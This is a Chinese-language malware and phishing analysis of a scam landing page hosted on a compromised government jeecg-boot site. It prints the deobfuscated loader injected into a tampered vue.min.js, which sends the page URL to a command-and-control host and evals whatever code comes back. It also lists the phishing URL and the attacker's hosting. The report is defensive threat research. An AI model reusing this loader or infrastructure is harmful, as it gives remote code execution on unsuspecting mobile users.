# 射洪政府网站钓鱼页面分析

> 分析日期: 2025-12-01

## 概述

发现政府域名 `wmsj.shehong.gov.cn`（射洪市新时代文明实践中心平台）的 jeecg-boot 后台系统被利用托管钓鱼页面，与 `miss55kkse.js` 中的诈骗活动属于同一团伙。

## 钓鱼页面地址

```
https://wmsj.shehong.gov.cn/jeecg-boot/8b13145ccf1_1742027375630.html?157?1578?ppp
```

## 页面技术分析

### HTML 特征

- **标题**: `❤`（心形符号，隐藏真实意图）
- **Referrer策略**: `no-referrer`（防止追踪来源）
- **语言**: `Zh_CN`

### 诈骗逻辑

页面使用 Vue.js + Vant UI 构建，核心逻辑：

```javascript
// 强制用户等待30秒
if (curTime - this.enterTime < 30000) {
    // 30秒内点击显示"请先完成上述流程"
} else {
    // 30秒后弹出QQ群二维码
}
```

## 涉及资源链接

### 1. JavaScript 库（阿里云 OSS - 2026osshy）

| 资源 | 链接 | 状态 |
|------|------|------|
| Vue.js | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/vue.min.js` | ⚠️ **已被篡改注入恶意代码** |
| Flexible.js | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/flexible.js` | ✅ 未被篡改（阿里lib-flexible原版） |

#### Vue.js 注入分析

`vue.min.js` 文件基于 Vue.js 2.7.0，但在末尾被注入了混淆的恶意代码：

```javascript
// 解混淆后的恶意代码逻辑：
(function() {
    var storage = localStorage;
    var count = storage.getItem('c') || '0';
    storage.setItem('c', Number(count) + 1);
    
    // 仅在移动端且访问次数<2时执行
    if (navigator.userAgent.includes('Mobile') && count < 2) {
        fetch('https://collect-v6.51la.ink/v6/collect?dt=4', {
            method: 'post',
            body: btoa(location.href)  // Base64编码当前URL
        })
        .then(response => response.text())
        .then(code => eval(code));  // 执行远程返回的代码！
    }
})();
```

**恶意行为：**
1. 使用 localStorage 计数，仅前2次访问时触发
2. 检测移动端用户（`navigator.userAgent.includes('Mobile')`）
3. 将当前页面URL Base64编码后发送到 `collect-v6.51la.ink`
4. **执行服务器返回的任意JavaScript代码** (`eval`)

**C2服务器：** `https://collect-v6.51la.ink/v6/collect?dt=4`
- 51la 是中国的网站统计服务，此域名可能是伪装或被滥用

#### Flexible.js 分析

`flexible.js` 是阿里巴巴的移动端自适应方案 [lib-flexible](https://github.com/amfe/lib-flexible)，代码未被篡改，功能正常：
- 根据设备像素比调整 body 字体大小
- 设置 1rem = viewWidth / 10
- 监听 resize 和 pageshow 事件
- 检测 0.5px 支持

### 2. CDN 资源

| 资源 | 链接 |
|------|------|
| Vant CSS | `https://cdn.bootcdn.net/ajax/libs/vant/2.12.9/index.min.css` |
| Vant JS | `https://cdn.bootcdn.net/ajax/libs/vant/2.12.9/vant.min.js` |

### 3. 图片资源

| 用途 | 来源 | 链接 | IPFS 备份 |
|------|------|------|------|
| 头图（诱导） | 腾讯视频 | `https://zenvideo-pro.gtimg.com/assets/upload/xzq5n4mi1fltvazt3t0n0w7/20231225/87061d5b-8936-4012-8275-aef96ef4d7a4.jpeg` | `bafybeifqyntn34r7txa6frglxqwpmcrtxyf4bq3f2wxtnn3lgmfiozn2le` |
| **活码二维码** | 阿里云OSS | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/ma.jpg` | `bafkreie2srffcrh5kogwwlfjhkvo2upiqunvu3ma2nb6z53rlpzvflihcm` |
| 操作教程 | 京东 | `https://dd-static.jd.com/ddimg/jfs/t1/17038/22/20361/154772/65a16b55F6797045a/ee51452c8393f7e0.jpg` | `bafybeig2df4pmbh4xpvh2dym3ti2aaeg4rwx325jzfmzfqau4tpclhfes4` |
| 底图（可点击） | 腾讯视频 | `https://zenvideo-pro.gtimg.com/assets/upload/xzq5n4mi1fltvazt3t0n0w7/20231225/e6fd4fec-90f8-49a6-c434-06fd9e57ebbd.jpeg` | `bafkreidqrafmcr6tycq2an5cyhmk4y4uqtqlxuy2uwc44s2x5degs7txz4` |
| QQ群二维码 | 阿里云OSS | `https://2026osshy.oss-cn-hangzhou.aliyuncs.com/ad/qrCode.jpg` | ❌ 原链接已失效 |

### 4. DNS 预取

```
https://article.biliimg.com
```

## 与 miss55kkse.js 的关联

在 `miss55kkse.js` 第82行发现该URL被注释：

```javascript
// "https://wmsj.shehong.gov.cn/jeecg-boot/8b13145ccf1_1742027375630.html?157?1578?ppp",
```

**证据表明**：
1. 同一诈骗团伙运营
2. 所有资源托管在同一阿里云OSS账户 `2026osshy`
3. 该页面作为备用落地页使用

## 诈骗流程

```
1. 用户通过 QQ 分享链接访问钓鱼页面
        ↓
2. 页面展示诱导图片，强制等待30秒
        ↓
3. 30秒后点击弹出QQ群二维码
        ↓
4. 用户扫码加入QQ群
        ↓
5. 群内实施进一步诈骗
   - 诱导下载"挂机赚钱"APP
   - 声称可领取"200元红包"
   - 虚假承诺"QQ超级会员"
```

## 安全警告

⚠️ **射洪市新时代文明实践中心平台 (wmsj.shehong.gov.cn) 的 jeecg-boot 系统可能已被入侵**

建议：
1. 向该网站管理员举报
2. 向国家互联网应急中心 (CNCERT) 报告
3. 不要访问该链接或扫描任何二维码

## 关联文件

- [miss55kkse.js](./miss55kkse.js) - 主要诈骗脚本
- [miss55kkse_analysis.md](./miss55kkse_analysis.md) - 主脚本分析
